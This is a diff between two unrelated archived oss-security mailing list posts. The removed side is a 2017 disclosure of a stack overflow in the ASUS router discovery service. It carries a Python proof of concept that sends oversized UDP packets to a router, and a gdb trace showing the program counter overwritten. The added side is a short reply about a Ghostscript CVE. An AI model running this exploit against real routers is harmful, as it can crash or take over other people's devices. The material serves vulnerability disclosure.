@@ -1,171 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/13/1
-Message-ID: <eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>
-Date: Thu, 13 Jul 2017 10:57:45 +0800
-From: varsleak <varsleak@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/29/1
+Message-ID: <CAPGxrc_kUAFA6Y_QnSxx-iyt2kGoKG1=RCSKUGE=ot1qvTtL=w@mail.gmail.com>
+Date: Sat, 29 Apr 2017 10:43:50 +0800
+From: redrain root <rootredrain@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability
+Subject: Re: CVE-2017-8291 ghostscript remote code execution
 Content-Type: text/plain; charset=utf-8
 
-Hello, I review the source of asuswrt-merlin and found a Remote
-Command/Code Execution, the detail as follows:
+what a awkward??
+I have discovered a part of my vulns about ghostscript last year and
+exploited in fulldisclosure early!
+and these vulns are part of mine I was going to discovered these in defcon
+or other conference...WTF...
+u guys are logo designer???
+
+there are two demos last year
+Evince Arbitrary Code Execution https://youtu.be/wzcrHXngfcM Attack Imagick
+through Ghostscript https://youtu.be/tPGm_ANDyOw
 
 
-1. Vulnerability Details
-     Affected Vendor:RT-AC5300,RT_AC1900P,RT-AC68U,RT-AC68P,RT-AC88U,
-     RT-AC66U,RT-AC66U_B1,RT-AC58U,RT-AC56U,RT-AC55U,RT-AC52U,RT-AC51U,
-     RT-N18U,RT-N66U,RT-N56U,RT-AC3200,RT-AC3100,RT_AC1200GU,
-     RT_AC1200G,RT-AC1200,RT-AC53,RT-N12HP,RT-N12HP_B1,RT-N12D1,
-     RT-N12+,RT_N12+_PRO,RT-N16,RT-N300
-     and Asuswrt-Merlin(https://github.com/RMerl/asuswrt-merlin)
-     Affected Product: ASUS Wiress Router
-     Affected Version:  all the latest firmware
-     Platform: router
-     Impact: Remote Command/Code Execution
-     Attack vector: asusdiscorvery service
+Regards,
+redrain
 
-2. Vulnerability Description
-     When an ASUS router discovers another router device,
-     it does not buffer the size of all discovered devices
-     when it is added to the device list to cause a stack overflow,
-     resulting in a remote code/command execution vulnerability.
-     The vulnerability code is as follows:
 
-https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/ASUS_Discovery.c#L184-L202
 
-3. PoC:
-<<<EOF
-# coding=utf-8
+2017-04-28 19:37 GMT+08:00 David Black <dblack@...assian.com>:
 
-import time
-import socket
-import sys
-import os
-import threading
-import struct
-import random
-import time
-''' Please run PoC first, and it must run on windows '''
-class ASUSDiscoveryBufferOverflow:
-	""" set remote host and remote port to use exp """
-	def __init__(self, RHOST, RPORT, LHOST):
-		self.RHOST = RHOST
-		self.RPORT = RPORT
-		self.LHOST = LHOST
-	
-	def exploit(self):
-		""" execute exploit """
-		self.searchDevice()
-		self.sentShellCode()
-		
-	def searchDevice(self, socket_prot = socket.IPPROTO_UDP):
-		""" search ASUS Discovery packet """
-		print("    [-] try to search ASUS Discovery packet")
-		while(True):
-			sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_prot)
-			sniffer.bind((self.LHOST, 0))
-			sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-			if os.name == 'nt':
-				sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
+> On Friday, 28 April 2017, Kurt H Maier <khm@...ops.net> wrote:
+>
+> > On Fri, Apr 28, 2017 at 01:50:04AM -0000, security@...assian.com
+> > <javascript:;> wrote:
+> >
+> >
+> > Why are you sending user-tracking urls to this list?
+> >
+> >
+> Hi Kurt,
+> We did not intend to send user tracking urls to this list. However, the
+> method we used to send the email resulted in sendgrid rewriting the the
+> links. We apologise regardless.
+>
+>
+> --
+> David.
+>
+>
+> --
+> David Black / Security Engineer.
+>
 
-			pkt, hosts = sniffer.recvfrom(65565)
-			
-			if self.RHOST == hosts[0] and '\x11' == pkt[9]:
-				if (pkt[28] == '\x0C' and
-				pkt[29] == '\x15' and
-				pkt[30] == '\x1F' ):
-					print("    [+] bingo!")
-					break
-
-	def sentShellCode(self):
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		
-		for i in range(15):
-			s.sendto(self.makeShellCode(), (self.RHOST, self.RPORT))
-			print(" [-] sent %d cycle" % (i + 1))
-			time.sleep(0.2)
-	
-	def generatingRandomMacAddr(self):
-		tmp1 = random.randint(0, 0xff)
-		tmp2 = random.randint(0, 0xff)
-		tmp3 = random.randint(0, 0xff)
-		tmp4 = random.randint(0, 0xff)
-		tmp5 = random.randint(0, 0xff)
-		tmp6 = random.randint(0, 0xff)
-		return struct.pack('6B', \
-			tmp1, tmp2, tmp3, tmp4, tmp5, tmp6)
-			
-	def makeShellCode(self):	
-		shellcode = "\x0c\x16\x1f\x00" # HEADER [ PLEASE NOT MODIFY ]
-		shellcode += (128 * b'A') # PKT_GET_INFO.PrinterInfo
-		shellcode += (32 * b'A')  # PKT_GET_INFO.SSID
-		shellcode += (32 * b'A')  # PKT_GET_INFO.NetMask
-		shellcode += (32 * b'A')  # PKT_GET_INFO.ProductID
-		shellcode += (16 * b'A')  # PKT_GET_INFO.FirmwareVersion
-		shellcode += b'A'		 # PKT_GET_INFO.OperationMode
-		shellcode += self.generatingRandomMacAddr() # PKT_GET_INFO.MacAddress	
-		shellcode += (261 * b'A') #
-
-		return shellcode
-		
-def main():
-	poc = ASUSDiscoveryBufferOverflow('192.168.2.1', 9999, '127.0.0.1')
-	
-	print("[+] Try to use exploit ...")
-	
-	poc.exploit()
-	
-	print("[+] use exploit sucessful.")
-
-if __name__ == '__main__':
-	main()
-EOF;
-
-4. gdb trace
-admin@...N12HP_B1:/tmp/bin# gdb /usr/sbin/asusdiscovery
-
-GNU gdb 6.8
-Copyright (C) 2008 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later
-<http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "mipsel-linux"...
-I'm sorry, Dave, I can't do that.  Symbol format `elf32-tradlittlemips'
-unknown.
-(gdb) r
-Starting program: /usr/sbin/asusdiscovery
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-(gdb) info r
-          zero       at       v0       v1       a0       a1       a2
-  a3
- R0   00000000 00000000 303e3134 00423a80 7fd650e8 00000001 00001000
-00423a80
-            t0       t1       t2       t3       t4       t5       t6
-  t7
- R8   00423000 00423000 00000581 3a31343a 41414141 2ab89124 41414141
-2ab0fe10
-            s0       s1       s2       s3       s4       s5       s6
-  s7
- R16  41414141 41414141 41414141 41414141 41414141 41414141 41414141
-41413e41
-            t8       t9       k0       k1       gp       sp       s8
-  ra
- R24  00000014 2ab6ad70 7fd65f66 00000000 0041c050 7fd65d30 41414141
-41414141
-        status       lo       hi badvaddr    cause       pc
-      01009c13 0000035d 00000070 41414140 00000008 41414141
-          fcsr      fir  restart
-      00000000 00000000 00000000
-
-As we have seen, the registers s0-s8,t4,t6,ra and pc are overwritten by
-0x41.
-
-Finally, with the ROP can lead to Remote Command Execution.
-
-5. Discover
-    varsleak of Sichuan Silent Information Technology Co., Ltd
-    company website: http://www.silence.com.cn/
